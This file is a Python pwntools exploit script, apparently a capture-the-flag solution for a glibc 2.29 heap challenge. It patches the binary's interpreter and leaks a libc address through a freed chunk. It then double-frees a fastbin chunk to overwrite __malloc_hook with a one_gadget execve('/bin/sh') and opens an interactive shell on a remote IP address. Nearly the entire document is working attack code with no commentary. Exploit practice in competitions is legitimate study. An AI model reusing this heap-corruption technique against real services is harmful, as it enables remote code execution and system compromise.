from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

def add(size,name,call):
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil(' name')
    p.sendline(str(size))
    p.recvuntil('her name:')
    p.send(name)
    p.recvuntil('her call:')
    p.send(call)

def show(index):
    p.recvuntil('choice:')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(index))

def call(index):
    p.recvuntil('choice:')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(index))

elf = change_ld('./chall', './ld-2.29.so')
debug = 0
if debug == 1:
	p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
else:
	p = remote('34.92.96.238', 10001)

#gdb.attach(p)
for i in range(7):
    add(0x100,'aaaa','aaaa')
add(0x100,'AAAA','AAAA')
add(0x100,'BBBB','BBBB')
for i in range(7):
    call(i)
call(7)
call(8)
show(7)
#gdb.attach(p)
p.recvline()
p.recvline()
main_arena = u64(p.recvline()[:6].ljust(8,'\x00')) - 96
libc_base = main_arena - 0x3B1C40
malloc_hook = libc_base + 0x3b1c30
realloc = libc_base + 0x80ef0
'''
0xdf991 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

'''
one_gadget = libc_base + 0xdf991
print hex(libc_base)
for i in range(7):
    add(0x70,'aaaa','aaaa')
add(0x70,'AAAA','AAAA')#16 
add(0x70,'BBBB','BBBB')#17
for i in range(7):
    call(i + 9)
call(16)
call(17)
call(16)
for i in range(7):
    add(0x70,'aaaa','aaaa')

add(0x70,p64(malloc_hook - 0x23),'CCCC')#25 16 
add(0x70,'DDDD','DDDD')#26 17
add(0x70,'EEEE','EEEE')#27 16
#gdb.attach(p)
add(0x70,'\x00' * 27 + p64(one_gadget) + p64(realloc + 6 ),'FFFF')
print hex(malloc_hook - 0x23)
print hex(one_gadget)
p.recvuntil('choice:')
p.send('1')
p.interactive()





















